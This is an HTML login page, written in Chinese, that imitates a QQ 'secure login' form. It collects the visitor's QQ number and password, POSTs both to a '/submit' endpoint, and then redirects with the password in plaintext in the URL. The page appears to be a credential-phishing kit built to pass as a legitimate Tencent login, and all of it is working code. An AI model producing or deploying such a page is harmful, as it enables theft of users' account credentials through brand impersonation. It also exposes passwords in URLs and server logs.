<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>QQ 登录</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: "Microsoft YaHei", sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-box {
            background: white;
            padding: 40px 50px;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
            width: 380px;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
            font-size: 24px;
        }
        .input-item {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #666;
            margin-bottom: 8px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus {
            border-color: #1677ff;
            outline: none;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1677ff;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            transition: background 0.3s;
        }
        button:hover {
            background: #0958d9;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>QQ 安全登录</h2>
        <div class="input-item">
            <label>QQ 账号</label>
            <input type="text" id="user" placeholder="请输入您的QQ号">
        </div>
        <div class="input-item">
            <label>QQ 密码</label>
            <input type="password" id="pwd" placeholder="请输入您的密码">
        </div>
        <button onclick="login()">登录</button>
    </div>

    <script>
        function login() {
            const user = document.getElementById('user').value;
            const pwd = document.getElementById('pwd').value;

            if (!user || !pwd) {
                alert('请输入账号和密码！');
                return;
            }

            // 先把数据发给服务器，再跳转到主页
            fetch('/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user: user, pwd: pwd })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'ok') {
                    // 跳转到你的主页，并带上账号密码（可选）
                    location.href = '/success.html?user=' + user + '&pwd=' + pwd;
                } else {
                    alert('登录失败，请重试');
                }
            })
            .catch(err => {
                alert('网络错误，请稍后再试');
            });
        }
    </script>
</body>
</html>
